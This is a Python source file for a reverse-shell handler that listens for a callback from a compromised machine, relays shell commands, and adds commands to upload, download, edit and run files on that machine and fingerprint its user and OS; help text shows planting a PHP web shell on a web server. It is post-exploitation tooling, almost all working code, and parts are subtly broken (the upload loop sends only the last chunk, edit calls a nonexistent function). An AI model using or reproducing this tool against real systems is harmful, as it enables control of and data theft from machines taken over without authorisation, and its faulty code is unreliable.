import os
import sys
import time
import errno
import shlex
import socket
import struct
import random
import base64
from xmlrpc.client import boolean
import utils

class Socket:
    sock = None
    conn = None
    addr = None
    port = None
    interface = None

    def __init__(self, port: int = 0, interface: str = ""):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((interface, int(port)))
        except socket.timeout:
            print("[!] Error: Connection timed out")
            self.close()
        except socket.error as err:
            print("[!] Error: Connection lost")
            print(err)
            self.close()
    
    def listen(self, hosts: list = None) -> None:
        """
        Handle listener and wait for reverse shell connection
        """
        try:
            self.sock.listen(1)
            self.interface = self.sock.getsockname()[0]
            self.port = self.sock.getsockname()[1]
            if self.interface == "0.0.0.0":
                print("[+] Listening on <%s:%d>" % ("all-interfaces", self.port))
            else:
                print("[+] Listening on <%s:%d>" % (self.interface, self.port))

            self.conn, self.addr = self.sock.accept()
            self.conn.setblocking(0)
            print("[+] Got connection from <%s:%d>" % (self.addr[0], self.addr[1]))

            if hosts and self.addr[0] not in hosts:
                print("[-] Disconnecting host %s, not in hosts whitelist." % self.addr[0])
                print("")
                self.conn.shutdown(socket.SHUT_RDWR)
                self.listen(hosts)
        except socket.timeout:
            print("[!] Error: Connection timed out")
            self.close()
        except socket.error as err:
            print("[!] Error: Connection lost")
            print(err)
            self.close()

    def send(self, message: str, chunksize: int = 2048) -> None:
        """
        Send bytes of data through the socket
        """
        for chunk in self._chunks(message, chunksize):
            self.conn.send(bytes(chunk, encoding='utf-8'))
        time.sleep(0.1)

    def receive(self, print_output: bool = False, chunksize: int = 2048) -> None:
        """
        Receive data from the socket
        """
        output = ""

        try:
            while True:
                data = self.conn.recv(chunksize)
                output += str(data)
                if print_output == True: sys.stdout.write(bytes.decode(data, "utf-8"))
                if not data: break
        except socket.timeout:
            print("[!] Error: Connection timed out")
            self.close()
        except socket.error as err:
            err = err.args[0]
            if err == errno.EAGAIN or err == errno.EWOULDBLOCK:
                return output.lstrip("b").replace('"', '').replace("'", "").replace('\\n', '')
            else:
                print("[!] Error: Connection lost")
                self.close()

    def close(self, exit: bool = True) -> None:
        """
        Close socket connection
        """
        try:
            self.sock.close()
            if exit: sys.exit()
        except socket.error as err:
            print("[!] Error: " + str(err))

    def _chunks(self, lst, chunksize):
        for i in range(0, len(lst), chunksize):
            yield lst[i:i+chunksize]

class Shell:
    rsh = None
    sock = None
    persistent = None
    quit = False
    last_output = ""
    last_input = ""
    shell_prompt = ""
    prompts = ["> ", "% ", "$ ", "# "]

    def __init__(self, sock, persistent = False):
        self.sock = sock
        self.rsh = RSH(sock)
        self.persistent = persistent

    def _has_prompt(self) -> bool:
        """
        Return True if the shell has prompt
        """
        return self.shell_prompt != "" and any(self.shell_prompt in s for s in Shell.prompts)

    def _get_prompt(self) -> str :
        """
        Return prompt
        """
        if self._has_prompt():
            return self.shell_prompt
        else:
            return "> "

    def _print_prompt(self) -> None:
        """
        Print prompt
        """
        sys.stdout.write(self._get_prompt())

    def interact(self) -> None:
        """
        Give reverse shell control to the user
        """
        time.sleep(0.1)
        RSH.help(self)
        RSH.fingerprint(self)
        while True:
            self.output()
            self.input()
            if self.quit:
                print("[+] Closing shell..")
                break

    def output(self) -> None:
        """
        Retrieve the output of the last command
        """
        self.last_output = self.sock.receive(True)
        if self.last_output != None and self.last_output != "" and self._has_prompt() == False:
            self.shell_prompt = self.last_output[-2:]

    def input(self) -> None:
        """
        Get a command from the user and send it to the distant machine
        """
        try:
            if (self._has_prompt()):
                command = input("")
            else:
                command = input(self._get_prompt())

            if command.startswith("rsh"):
                if command == "rsh exit":
                    self.quit = True
                    return
                else:
                    self.rsh.shell_dispatch(command)
                    if self._has_prompt(): self._print_prompt()
                    return

            if command.startswith("\\rsh"):
                command = command[1:]

            self.sock.send(command + "\n")

        except KeyboardInterrupt:
            if self.persistent:
                self.sock.send(struct.pack('B', int("0x03", 16)))
            else:
                self.quit = True
                print("")


class RSH:
    sock = None

    def __init__(self, sock: sock):
        self.sock = sock

    def shell_dispatch(self, command: str) -> None:
        """
        Handle reverse shell specific commands
        """
        argv = shlex.split(command)

        if len(argv) > 1 and argv[1] == "upload":
            if len(argv) > 2:
                if len(argv) > 3:
                    self.upload(argv[2], argv[3])
                    return
                else:
                    self.upload(argv[2])
                    return
            else:
                self.help("upload")
                return

        if len(argv) > 1 and argv[1] == "download":
            if len(argv) > 2:
                if len(argv) > 3:
                    self.download(argv[2], argv[3])
                    return
                else:
                    self.download(argv[2])
                    return
            else:
                self.help("download")
                return

        if len(argv) > 1 and argv[1] == "edit":
            if len(argv) > 2:
                self.edit(argv[2])
                return
            else:
                self.help(argv[1])
                return

        if len(argv) > 1 and (argv[1] == "execute" or argv[1] == "exec"):
            if len(argv) > 2:
                if len(argv) > 3:
                    self.execute(argv[2], ' '.join(argv[3:]))
                else:
                    self.execute(argv[2])
                return
            else:
                self.help(argv[1])
                return

        if len(argv) > 1 and argv[1] == "fingerprint":
            self.fingerprint()
            return
        
        if len(argv) > 1 and argv[1] == "help":
            if len(argv) > 2:
                self.help(argv[2])
                return
            else:
                self.help()
                return

        print("[!] Error: Unknown command '%s'" % command)

    def help(self, command: str = None) -> None:
        """
        Print reverse shell help
        """
        if command != None:
            if command == "exit":
                print("")
                print("Usage: rsh exit                                                                               ")
                print("  Exits the current shell by closing the socket.                                              ")
                print("  By default, 'rsh exit' is executed when ^C (ctrl + c) is pressed.                           ")
                print("  This feature can be disabled by using the -P or --persistent parameter when running the     ")
                print("  program.                                                                                    ")
                print("")

            if command == "upload":
                print("")
                print("Usage: rsh upload <localfile> [<remotefile>]                                                  ")
                print("  Upload a file to the remote shell, this is done by reading the local file and echoing       ")
                print("  the contents into the remote file. The script checks if your shell has permission to write  ")
                print("  to the specified location. If not, your shell will be prompted to upload to /tmp/.. or quit ")
                print("  the current upload. If no remotefile is specified it will try to echo the file in the       ")
                print("  current working directory. If the file exists, your shell will be prompted to overwrite the ")
                print("  remote file.                                                                                ")
                print("                                                                                              ")
                print("Examples:                                                                                     ")
                print("  rsh upload /root/evil.php                     | Uploads a file to /tmp/12345-evil.php       ")
                print("  rsh upload /root/evil.php /home/www/shell.php | Uploads a file to /home/www/shell.php       ")
                print("")

            elif command == "download":
                print("")
                print("Usage: rsh download <remotefile> [<localfile>]                                                ")
                print("  Download a file from the remote shell to a local file. This is done by echoing the file,    ")
                print("  and writing the output to a local file. The script checks for permission read the file from ")
                print("  the remote shell before reading it. The script will quit if permission is denied. If no     ")
                print("  localfile parameter is passed through, the script will save the file in a randomized        ")
                print("  filename in the /tmp/ directory.                                                            ")
                print("                                                                                              ")
                print("Examples:                                                                                     ")
                print("  rsh download /home/www/index.php                 | Downloads a file to /tmp/12345-index.php ")
                print("  rsh download /home/www/index.php /root/owned.php | Downloads a file to /root/owned.php      ")
                print("")

            elif command == "execute" or command == "exec":
                print("")
                print("Usage: rsh execute <localfile> [<params>]                                                     ")
                print("  Upload an execute a binary file or script to the remote shell and removes the script after  ")
                print("  execution. Parameters will be added to the file execution. See 'rsh help upload' and        ")
                print("  'rsh help download' for more information about file transfers.                              ")
                print("                                                                                              ")
                print("Examples:                                                                                     ")
                print("  rsh execute /root/somebinary      | Uploads a binary and executes it                        ")
                print("  rsh execute /root/somebinary -abc | Uploads a binary and executes it with parameters        ")
                print("")

            elif command == "edit":
                print("")
                print("Usage: rsh edit <remotefile> [-f | --force]                                                   ")
                print("  Download, edit and re-upload a text based file on the remote shell. The script will first   ")
                print("  detect if the file has rights to read and write the files. If the local file after editing  ")
                print("  has not changed, no file will be re-uploaded. Use the -f or --force parameter to force the  ")
                print("  script to re-upload the file.                                                               ")
                print("                                                                                              ")
                print("Examples:                                                                                     ")
                print("  rsh edit /home/www/index.php    | Edit a file from the remote server                        ")
                print("  rsh edit /home/www/index.php -f | Force a re-write after editing a file                     ")
                print("")

            elif command == "fingerprint":
                print("")
                print("Usage: rsh fingerprint                                                                        ")
                print("  Fingerprint the remote shell by executing a list of commands. This is to check permissions  ")
                print("  type of server running etc.                                                                 ")
                print("                                                                                              ")
                print("Examples:                                                                                     ")
                print("  rsh fingerprint | Fingerprints the remote shell                                             ")
                print("")
            else:
                print("[!] Unknown command %s, type 'rsh help' for a list of all commands                            ")

        else:
            print("")
            print("Usage: rsh <command> [<parameter> [<parameter> ..]]                                               ")
            print("  rsh exit                                   | Exit the current shell session                     ")
            print("  rsh help [<command>]                       | Print detailed information about an RSH command    ")
            print("  rsh upload <localfile> [<remotefile>] [-f] | Upload a file to the remote shell                  ")
            print("  rsh download <remotefile> [<localfile>]    | Download a file from the remote shell              ")
            print("  rsh execute <localfile> [<params>]         | Upload and execute a file on the remote shell      ")
            print("  rsh exec <localfile> [<params>]            | Shorthand for execute                              ")
            print("  rsh edit <remotefile> [-f]                 | Edit a text based file on the remote shell         ")
            print("  rsh fingerprint                            | Fingerprint the remote shell system                ")
            print("")

    def _generate_key(self) -> int:
        """
        Return a random int
        """
        return random.randrange(15000, 9999999999)

    def _generate_tmpname(self, filename: str) -> str:
        """
        Generate a random name in /tmp directory
        """
        return "/tmp/%d-%s" % (self._generate_key(), filename.split('/')[-1])

    def validate_permissions(self, operator: str, remotefile: str) -> str:
        """
        Check if the file permissions
        """
        key = self._generate_key()
        self.sock.send("[ -%s %s ] && echo %d\n" % (operator, remotefile, key))
        output = self.sock.receive(False)
        return str(key) in output or "--debug" in sys.argv

    def is_readable(self, remotefile: str) -> str:
        """
        Check if the file is readable
        """
        return self.validate_permissions('r', remotefile)

    def is_writable(self, remotefile: str) -> str:
        """
        Check if the file is writable
        """
        return self.validate_permissions('w', remotefile)

    def is_executable(self, remotefile: str) -> str:
        """
        Check if the file is executable
        """
        return self.validate_permissions('x', remotefile)

    def file_exists(self, remotefile: str) -> str:
        """
        Check if the file exists
        """
        return self.validate_permissions('e', remotefile)

    def upload(self, localfile: str, remotefile: str = None) -> bool:
        """
        Upload a file to the distant machine
        """
        if remotefile == None:
            remotefile = "$(pwd)/" + localfile.split('/')[-1]
            remotedir = "$(pwd)/"
        else:
            remotedir = remotefile.rsplit('/', 1)[0]

        if not os.path.isfile(localfile):
            print("[!] Error: File %s not found!" % localfile)
            return False

        print("[+] Checking %s for write permissions.." % remotedir.replace("$(pwd)/", ""))
        if self.is_writable(remotedir):
            if self.file_exists(remotefile) and self.is_writable(remotefile):
                if not utils.prompt("[?] Remote file %s exists, overwrite?" % remotefile.replace("$(pwd)/", "")):
                    print("[-] Aborted file upload.")
                    return False

            print("[+] Uploading %s.." % localfile)

            self.sock.send("/bin/echo -n '' > %s\n" % remotefile)
            self.sock.receive()

            
            file = open(localfile, 'rb')
            while True:
                chunk = file.read(16384)
                if not chunk: 
                    break
                chunk = base64.b64encode(chunk)
                message = chunk.decode(encoding='utf-8')
            self.sock.send("/bin/echo -en %s | base64 -d >> %s\n" % (str(message), remotefile)) # Pb here (special char in privesc script that triggers a syntax error)
            self.sock.receive()
            file.close()

            print("[+] Successfully uploaded file to %s!" % remotefile.replace("$(pwd)/", ""))
            return True
        else:
            if utils.prompt("[?] Permission denied, write to /tmp instead?"):
                return self.upload(localfile, self._generate_tmpname(localfile))
            else:
                print("[-] Aborted file upload.")
                return False

    def download(self, remotefile: str, localfile: str = None) -> None:
        """
        Download a file from the distant machine
        """
        if localfile == None:
            localfile = self._generate_tmpname(remotefile)

        print("[+] Checking if %s exists.." % remotefile)
        if not self.file_exists(remotefile):
            print("[!] Error: File does not exist")
            return

        print("[+] Checking %s for read permissions.." % remotefile)
        if not self.is_readable(remotefile):
            print("[!] Error: Permission denied")
            return

        try:
            print("[+] Downloading %s.." % (remotefile))
            self.sock.send("cat %s\n" % remotefile)
            file = open(localfile, 'w')
            file.write(self.sock.receive())
            file.close()
            print("[+] Successfully downloaded file to %s!" % localfile)
            return localfile
        except Exception as err:
            print("[!] Error: %s" % err)

    def execute(self, localfile: str, params: str = "") -> None:
        """
        Upload a file and execute it on the distant machine
        """
        remotefile = self._generate_tmpname(localfile)
        if not self.upload(localfile, remotefile):
            print("[!] Failed to execute %s on remote server" % localfile)
            return

        self.sock.send("chmod +x %s\n" % remotefile)
        self.sock.receive()

        print("[+] Executing: %s %s" % (remotefile, params))
        self.sock.send("%s %s\n" % (remotefile, params))
        out = self.sock.receive(True)
        if out: print("")

        print("[+] Removing %s.." % remotefile)
        self.sock.send("rm -f %s\n" % remotefile)
        self.sock.receive()
        return remotefile

    def edit(self, remotefile: str) -> None:
        """
        Download a file from the distant machine, edit it and upload it back
        """
        localfile = self.download(remotefile, self._generate_tmpname(remotefile))
        if not localfile:
            print("[!] Failed to open %s for editing." % remotefile)
            return

        if self.upload(localfile, remotefile):
            print("[+] Successfully edited %s!" % remotefile)
            os.path.remove(localfile)
            return True
        else:
            print("[!] Failed to edit %s." % remotefile)
            return 

    def fingerprint(self) -> None:
        """
        Retrieve and print current user and the OS of the distant machine
        """
        self.sock.send("id\n")
        print("[+] ID level : %s" % self.sock.receive())
        self.sock.send("systeminfo | findstr /R '^OS name \s*(.*)'\n")
        if "not found" in self.sock.receive() :
            self.sock.send("cat /etc/os-release | head -n 1 | cut -d '=' -f2\n")
            print("[+] Operating system : %s" % self.sock.receive())
        else : print("[+] %s" % self.sock.receive())